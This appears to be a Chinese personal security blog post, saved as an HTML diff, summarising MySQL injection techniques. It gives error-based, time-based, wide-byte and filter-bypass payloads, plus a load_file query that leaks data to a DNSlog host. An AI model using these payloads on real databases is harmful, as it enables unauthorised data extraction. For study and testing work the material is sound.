@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/me_med.webp?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/me_med.webp?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="常用操作字符串截取函数left(str,index)  //从左边第index开始截取 right(str,index) //从右边第index开始截取 substring(str,index) //从左边index开始截取 substr(str,index,len) //截取str,index开始,截取len的长度 mid(str,index,ken) //截取str 从index开始,截取le">
+<meta name="keywords" content="security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql总结">
+<meta property="og:url" content="http://j1nse.top/2019/04/10/sql/index.html">
+<meta property="og:site_name" content="cgtx&#39;s blog">
+<meta property="og:description" content="常用操作字符串截取函数left(str,index)  //从左边第index开始截取 right(str,index) //从右边第index开始截取 substring(str,index) //从左边index开始截取 substr(str,index,len) //截取str,index开始,截取len的长度 mid(str,index,ken) //截取str 从index开始,截取le">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-04-11T15:16:31.077Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql总结">
+<meta name="twitter:description" content="常用操作字符串截取函数left(str,index)  //从左边第index开始截取 right(str,index) //从右边第index开始截取 substring(str,index) //从左边index开始截取 substr(str,index,len) //截取str,index开始,截取len的长度 mid(str,index,ken) //截取str 从index开始,截取le">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://j1nse.top/2019/04/10/sql/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>sql总结 | cgtx's blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cgtx's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://j1nse.top/2019/04/10/sql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cgtx">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/me.webp">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cgtx's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">sql总结
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-10 23:02:20" itemprop="dateCreated datePublished" datetime="2019-04-10T23:02:20+08:00">2019-04-10</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-04-11 23:16:31" itemprop="dateModified" datetime="2019-04-11T23:16:31+08:00">2019-04-11</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><h2 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h2><p>left(str,index)  //从左边第index开始截取</p>
+<p>right(str,index) //从右边第index开始截取</p>
+<p>substring(str,index) //从左边index开始截取</p>
+<p>substr(str,index,len) //截取str,index开始,截取len的长度</p>
+<p>mid(str,index,ken) //截取str 从index开始,截取len的长度</p>
+<h2 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h2><p>strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</p>
+<p>find_in_set(str,strlist) //如果相同则返回1不同则返回0</p>
+<h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><p>concat(str1,str2) //将字符串首尾相连</p>
+<p>concat_ws(separator,str1,str2) //将字符串用指定连接符连接</p>
+<p>group_concat()</p>
+<h2 id="一些绕过注入的罕见函数"><a href="#一些绕过注入的罕见函数" class="headerlink" title="一些绕过注入的罕见函数"></a>一些绕过注入的罕见函数</h2><p>instr(str1,substr) //从子字符串中返回子串第一次出现的位置</p>
+<p>lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</p>
+<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>(1)between //select database() between 0x61 and 0x7a; //select database() between ‘a’ and ‘z’;<br>(2)in //select ‘123’ in (‘12’) =&gt; 0<br>(3)like(模糊匹配) //select ‘12345’ like ‘12%’ =&gt; true<br>(4)regexp 或 rlike(正则匹配)//select ‘123455’ regexp ‘^12’ =&gt; true</p>
+<p>not或! 非<br>AND 逻辑与 == &amp;&amp;<br>OR 逻辑或 == ||<br>XOR 逻辑异或 == ^</p>
+<p>&amp; 按位与<br>| 按位或<br>^ 按位异或<br>! 取反<br>&lt;&lt; 左移</p>
+<blockquote>
+<blockquote>
+<p>右移</p>
+</blockquote>
+</blockquote>
+<p># //单行注释符,url记得编码为%23<br>/**/<br>–+</p>
+<h2 id="延时函数-时间盲注"><a href="#延时函数-时间盲注" class="headerlink" title="延时函数 时间盲注"></a>延时函数 时间盲注</h2><p>sleep()<br>benchmark(1000000,sha(1))<br>1.让两个非常大的数据表做笛卡尔积产生大量的计算从而产生时间延迟<br>2.如果服务器端采用长连接的话可以利用Mysql的锁机制即Get_lock()<br>3.利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟</p>
+<h2 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h2><p>hex() ascii()</p>
+<h2 id="文件函数"><a href="#文件函数" class="headerlink" title="文件函数"></a>文件函数</h2><p>load_file  //读取文件<br>outfile //写入文件</p>
+<h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><p>if(expr1,expr2,expr3) // expr1 true执行expr2否则执行expr3<br>select case when (条件) then 代码1 else 代码 2 end</p>
+<h2 id="information-schema结构-mysql-gt-5-0才有"><a href="#information-schema结构-mysql-gt-5-0才有" class="headerlink" title="information_schema结构 (mysql&gt;5.0才有)"></a>information_schema结构 (mysql&gt;5.0才有)</h2><p>information_schema.tables:<br>查询表名:table_name  对应的数据库名: table_schema<br>information_schema.columns:<br>查询列名:column_name 对应的表名:table_schemamysql盲注语句一般形式<br>查询结果 + 比较运算符 + 猜测值</p>
+<h2 id="mysql空白字符"><a href="#mysql空白字符" class="headerlink" title="mysql空白字符"></a>mysql空白字符</h2><p>%20 %09 %0a %0b %0c %0d %a0 /<strong>/ tab<br>%a0 这个不会被php的\s进行匹配<br>/<em>!</em>/ 内敛注释<br># 这个也可以用来做分隔 挺有意思<br>concat/</strong>/() 这种</p>
+<h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>floor()<br>and (select 1 from(select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a)</p>
+<p>updatexml() //5.1.5<br>and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
+<p>extractvalue() //5.1.5<br>and extractvalue(1,concat(0x5c,(select user())))</p>
+<p>exp() //5.5.5版本之后可以使用<br>select host from user where user = ‘root’ and Exp(~(select * from (select version())a));</p>
+<p>name_const //支持老版本<br>select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</p>
+<p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() //几何函数报错<br>select multipoint((select <em> from (select </em> from (select * from (select version())a)b)c));</p>
+<h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><blockquote>
+<p>MYSQL client链接编码的锅<br>查看编码:show variables like ‘%character%’<br>当客户端连接编码设置为GBK的时候 与php进行交互的时候就会出现字符转换 导致单引号逃逸的问题。<br>测试payload: index.php?id=%df%27<br>流程: %df%27-&gt;addslashes()-&gt;%df%5c%27-&gt;数据库交互gbk编码-&gt;運’</p>
+</blockquote>
+<blockquote>
+<p>MYSQL iconv函数 mb_convert_encoding函数的锅<br>借用先知: $id =iconv(‘GBK’,’UTF-8’, $id)<br>%df%27===(addslashes)===&gt;%df%5c%27===(iconv)===&gt;%e5%5c%5c%27<br>其实就是 utf8 -&gt; gbk -&gt;utf-8 低位的%5c 也就是反斜杠干掉了转义单引号的反斜杠</p>
+</blockquote>
+<blockquote>
+<p>Big5编码导致的宽字节注入<br>猜测代码: <code>iconv(&#39;utf-8&#39;,&#39;BIG5&#39;,$_GET[&#39;id&#39;])</code><br>payload构造同上: <code>功&#39;</code> -&gt; addsalshes -&gt; <code>功\&#39;</code> -&gt; iconv -&gt; <code>%A5%5C%5C%27</code>-&gt;<code>¥\&#39;</code> 逃逸单引号<code>%E8%B1%B9&#39;</code></p>
+</blockquote>
+<h2 id="浅谈DNSlog-SQL盲注"><a href="#浅谈DNSlog-SQL盲注" class="headerlink" title="浅谈DNSlog SQL盲注"></a>浅谈DNSlog SQL盲注</h2><p>在mysql中load_file 会带dns查询请求<br>具体可以参考 mysql带外攻击 out of band 安全客有这篇文章<br>首先查看变量确定权限<br>show variables like ‘%secure%’<br>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>2、当secure_file_priv为G:\，就可以读取G盘的文件。<br>3、当secure_file_priv为null，load_file就不能加载文件。<br>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>可以通过mysql的配置文件my.ini添加行进行配置<br>unc路径 网络共享文件方式 \xq17.com\tet这样的路径<br>用4个\是因为转义 本质是:\<br>最好进行加密处理 防止特殊字符导致失败 如下<br>select load_file(concat(0x5c5c5c5c,version(),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));<br>坑点:之前一直用bugscan的dnslog 用<br>select load_file(‘\\‘,version(),’.dnslog地址’) 发现一直收不到信息<br>注意一般分配给我们的是二级域名所以我们要有个点 把返回信息放在三级域名那里 后来用16进制加密之后就发现可以了 可能是传输的时候出现了@之类什么奇怪的字符 导致了传输失败</p>
+<p>总结:<br>1.对数据能加密尽量加密<br>2.dns解析 能很好解决盲打盲注的不可知的缺陷<br>3.缺点是:限制比较多</p>
+<h2 id="MYSQL的约束攻击"><a href="#MYSQL的约束攻击" class="headerlink" title="MYSQL的约束攻击"></a>MYSQL的约束攻击</h2><p>1.mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。</p>
+<p>2.mysql插入数据的时候,当数据超过定义的长度会出现截断现象</p>
+<p>3.截断后用户名就一样了<br>防御：<br>顾名思义,加个unique约束,就会导致在插入的时候,会做一次相同比较,(回到上面说的比较特性),避免发生这种情况.</p>
+<p>代码获取用户名写进session的时候用返回结果。</p>
+<p>用id作为主键</p>
+<h2 id="限制-过滤了information-schema-突破-获取表名"><a href="#限制-过滤了information-schema-突破-获取表名" class="headerlink" title="限制: 过滤了information_schema 突破:获取表名"></a>限制: 过滤了information_schema 突破:获取表名</h2><p>and polygon(id)# id如果是当前表存在的字段就爆出表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where name=&apos;1&apos; and polygon(id);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;`test`.`test`.`id`&apos; value found during parsing</span><br></pre></td></tr></table></figure></p>
+<p>用using爆列名<br>mysql&gt; select <em> from (select </em> from test as a join test as b)as c;<br>ERROR 1060 (42S21): Duplicate column name ‘id’<br>mysql&gt; select <em> from (select </em> from test as a join test as b using(id))as c;<br>ERROR 1060 (42S21): Duplicate column name ‘name’<br>mysql&gt; select <em> from (select </em> from test as a join test as b using(id,name))as c;<br>ERROR 1060 (42S21): Duplicate column name ‘password’</p>
+<h2 id="限制-过滤了字段名-可union-源码给出字段结构-次要-突破-获取指定字段内容"><a href="#限制-过滤了字段名-可union-源码给出字段结构-次要-突破-获取指定字段内容" class="headerlink" title="限制:过滤了字段名,可union 源码给出字段结构(*次要) 突破:获取指定字段内容"></a>限制:过滤了字段名,可union 源码给出字段结构(*次要) 突破:获取指定字段内容</h2><p>​$filterlist = “/(|)|username|password|id|where|case|=|like|sleep|for|into_outfile|load_file;<br>思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where name=&apos;xq17&apos;  union select 1,&apos;x&apos;,3 order by name; </span><br><span class="line">+----+------+----------+</span><br><span class="line">| id | name | password |</span><br><span class="line">+----+------+----------+</span><br><span class="line">|  1 | x    | 3        |</span><br><span class="line">|  1 | xq17 | 123456   |</span><br><span class="line">mysql&gt; select * from test where name=&apos;xq17&apos;  union select 1,&apos;w&apos;,3 order by name; </span><br><span class="line">+----+------+----------+</span><br><span class="line">| id | name | password |</span><br><span class="line">+----+------+----------+</span><br><span class="line">|  1 | w    | 3        |</span><br><span class="line">|  1 | xq17 | 123456   |</span><br><span class="line">+----+------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>通过 order by进行降序排序 就会发现 代码取返回的值会发生不同 就可以根据这个来写布尔盲注</p>
+<h2 id="限制了union-select等关键词-突破-获取内容"><a href="#限制了union-select等关键词-突破-获取内容" class="headerlink" title="限制了union select等关键词 突破:获取内容"></a>限制了union select等关键词 突破:获取内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where name=&apos;xq17&apos; &amp;&amp; password&lt;&apos;2&apos;;</span><br><span class="line">+----+------+----------+</span><br><span class="line">| id | name | password |</span><br><span class="line">+----+------+----------+</span><br><span class="line">|  1 | xq17 | 123456   |</span><br><span class="line">+----+------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h1 id="绕过关键词过滤注入"><a href="#绕过关键词过滤注入" class="headerlink" title="绕过关键词过滤注入"></a>绕过关键词过滤注入</h1><p>针对常见的正则过滤,比如/union|select/i (大小写不敏感) 这种直接干掉关键词做法<br> 可以尝试等价替换</p>
+<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤 ="></a>过滤 =</h2><p>1.函数绕过:<br>    strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1),                greatest() find_in_set()<br>2.&lt; &gt; &lt;&gt;<br>3.like regexp<br>4.in //select “123” in (“123”); =&gt; 1 select “123” in (“12”) =&gt;0</p>
+<p>参考文章:<br><a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">https://xz.aliyun.com/t/3992</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/10/hand/" rel="next" title="姿势手册">
+                <i class="fa fa-chevron-left"></i> 姿势手册
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/13/php-hand/" rel="prev" title="php审计trick">
+                php审计trick <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/me.webp" alt="cgtx">
+            
+              <p class="site-author-name" itemprop="name">cgtx</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#常用操作"><span class="nav-number">1.</span> <span class="nav-text">常用操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#字符串截取函数"><span class="nav-number">1.1.</span> <span class="nav-text">字符串截取函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#字符串比较"><span class="nav-number">1.2.</span> <span class="nav-text">字符串比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#字符串连接函数"><span class="nav-number">1.3.</span> <span class="nav-text">字符串连接函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些绕过注入的罕见函数"><span class="nav-number">1.4.</span> <span class="nav-text">一些绕过注入的罕见函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#运算符"><span class="nav-number">1.5.</span> <span class="nav-text">运算符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#延时函数-时间盲注"><span class="nav-number">1.6.</span> <span class="nav-text">延时函数 时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编码函数"><span class="nav-number">1.7.</span> <span class="nav-text">编码函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件函数"><span class="nav-number">1.8.</span> <span class="nav-text">文件函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#条件语句"><span class="nav-number">1.9.</span> <span class="nav-text">条件语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#information-schema结构-mysql-gt-5-0才有"><span class="nav-number">1.10.</span> <span class="nav-text">information_schema结构 (mysql&gt;5.0才有)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql空白字符"><span class="nav-number">1.11.</span> <span class="nav-text">mysql空白字符</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#姿势"><span class="nav-number">2.</span> <span class="nav-text">姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入"><span class="nav-number">2.1.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节"><span class="nav-number">2.2.</span> <span class="nav-text">宽字节</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#浅谈DNSlog-SQL盲注"><span class="nav-number">2.3.</span> <span class="nav-text">浅谈DNSlog SQL盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL的约束攻击"><span class="nav-number">2.4.</span> <span class="nav-text">MYSQL的约束攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#限制-过滤了information-schema-突破-获取表名"><span class="nav-number">2.5.</span> <span class="nav-text">限制: 过滤了information_schema 突破:获取表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#限制-过滤了字段名-可union-源码给出字段结构-次要-突破-获取指定字段内容"><span class="nav-number">2.6.</span> <span class="nav-text">限制:过滤了字段名,可union 源码给出字段结构(*次要) 突破:获取指定字段内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#限制了union-select等关键词-突破-获取内容"><span class="nav-number">2.7.</span> <span class="nav-text">限制了union select等关键词 突破:获取内容</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过关键词过滤注入"><span class="nav-number">3.</span> <span class="nav-text">绕过关键词过滤注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#过滤"><span class="nav-number">3.1.</span> <span class="nav-text">过滤 =</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cgtx</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">本博客与 <a href="http://github.com" class="theme-link" rel="noopener" target="_blank">Github</a> 深度合作!(笑)</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – NexT.Gemini</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <script id="ribbon" size="300" alpha="0.6" zindex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
